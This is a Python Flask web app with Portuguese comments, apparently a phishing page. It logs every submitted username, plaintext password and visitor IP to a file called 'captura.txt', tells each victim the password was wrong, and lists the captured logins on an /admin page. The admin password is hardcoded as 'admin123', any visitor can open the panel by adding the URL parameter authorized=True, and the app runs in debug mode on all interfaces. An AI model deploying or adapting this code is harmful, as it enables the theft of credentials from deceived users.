from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

ADMIN_PASSWORD = "admin123"

def get_real_ip():
    """Tenta pegar o IP real do visitante, mesmo atrás de proxies."""
    # Cabeçalhos comuns que proxies usam
    for header in ["X-Forwarded-For", "X-Real-IP", "CF-Connecting-IP"]:
        if header in request.headers:
            # Se tiver vários IPs, pega o primeiro (o real do cliente)
            ip_list = request.headers.get(header).split(",")
            ip = ip_list[0].strip()
            if ip:
                return ip
    # Se não tiver proxy, pega o remote_addr
    return request.remote_addr

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        user = request.form.get("username")
        passwd = request.form.get("password")
        ip = get_real_ip()  

        try:
            with open("captura.txt", "a", encoding="utf-8") as f:
                f.write(f"User: {user} | Pass: {passwd} | IP: {ip}\n")
        except Exception as e:
            print(f"Erro ao tentar escrever no arquivo: {e}")
            return render_template("login.html", error=f"Erro do servidor: {e}")

        if passwd == ADMIN_PASSWORD:
            return redirect(url_for('admin', authorized=True))
        else:
            return render_template("login.html", error="A senha que você digitou está incorreta. Tente novamente.")

    return render_template("login.html")


@app.route("/admin", methods=["GET", "POST"])
def admin():
    authorized = request.args.get('authorized') == 'True'

    if request.method == "POST":
        senha = request.form.get("admin_pass")
        if senha == ADMIN_PASSWORD:
            authorized = True
            try:
                with open("captura.txt", "r", encoding="utf-8") as f:
                    logins = f.readlines()
            except FileNotFoundError:
                logins = []
            return render_template("admin.html", logins=logins, authorized=authorized)
        else:
            return render_template("admin.html", error="Senha incorreta", authorized=False)

    # Se não estiver autorizado, redireciona pro login
    if not authorized:
        return redirect(url_for('login'))

    # Exibe a página admin sem POST
    try:
        with open("captura.txt", "r", encoding="utf-8") as f:
            logins = f.readlines()
    except FileNotFoundError:
        logins = []

    return render_template("admin.html", logins=logins, authorized=authorized)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
